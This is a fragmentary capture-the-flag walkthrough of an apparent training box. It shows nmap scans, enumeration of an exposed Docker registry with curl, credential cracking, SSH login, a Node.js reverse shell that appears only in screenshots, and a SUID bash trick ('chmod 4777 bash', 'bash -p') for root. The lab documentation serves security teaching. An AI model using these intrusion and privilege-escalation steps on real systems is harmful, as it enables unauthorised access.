...
```sh
-->>>> sudo nmap -sS 10.10.48.181 <<<<--
[sudo] password for mike: 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-22 23:28 CST
...
```sh
-->>>> nmap -sC -sV -p 22,3306,5000,8080 -oN 10.10.48.181_sc_sv 10.10.48.181 <<<<--
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-22 23:34 CST
Nmap scan report for 10.10.48.181
...
|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, InteractiveClient, LongColumnFlag, SupportsLoadDataLocal, SupportsTransactions, LongPassword, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, ConnectWithDatabase, FoundRows, IgnoreSigpipes, ODBCClient, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: r:5l"MmA\x199.H\x1Dw\x0D\x01\x0E\x13n]
...
1. list repositories 
```sh 
curl -s http://10.10.48.181:5000/v2/_catalog
{"repositories":["umbrella/timetracking"]}
```
![](/image/20240123002259.png)
2. Getting the tag of repositories 
```sh
curl -s http://10.10.48.181:5000/v2/umbrella/timetracking/tags/list
   ...
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "NHUS:ACTW:T6OH:YJTH:PB7Y:KCD5:LZNN:TRYW:3Y2M:S34K:C2JK:BBGL",
               "kty": "EC",
               "x": "U-Ko6MJ1QP82jMV9vKfGbEi_GrYp5keNEbw1Hkkn5so",
               "y": "pZImPpuUMiFK_Ct8rl0ahTcm6wn-isTyCDHKN8UnFbQ"
            },
            "alg": "ES256"
         },
         "signature": "0L07sjpx3eDn8_YzFWT10sEFbK0DFjPA1S4lYRK1EQFUui2hzDn1aNpUNMkGTPJq7q9xrH0_CrkW7KPzqQmVBQ",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjE2NDY2LCJmb3JtYXRUYWlsIjoiQ24wIiwidGltZSI6IjIwMjQtMDEtMjNUMDY6MzM6MThaIn0"
      }
   ]
}                                                                                                                                    
...
![](/image/20240123005920.png)

now we have to crack the `password` which is store in it.
![](/image/20240123011347.png)

now i will check site and login using the found cred :- 
![](/image/20240123083437.png)
at the same time i will use the cred for ssh and see if am i able to log in 
![](/image/20240123083517.png)
here we found the user flag![](/image/20240123083532.png)

Now coming back to webpage(port 8080)
here we can get reverse shell using node js ![](/image/20240123091712.png)

we get the shell here
![](/image/20240123091744.png)
now we have to stabilize the shell
![](/image/20240123120133.png)
done

at this point server time expired and my connection got terminated.

have to start once again form ssh 
![](/image/20240123113843.png)
once i get a shell form the webpage we will enumerate it.
![](/image/20240123120437.png)
...
3. chmod 4777 bash #From container as root inside mounted folder
4. ./bash -p #From non priv inside mounted folder
```
![](/image/20240123123005.png)
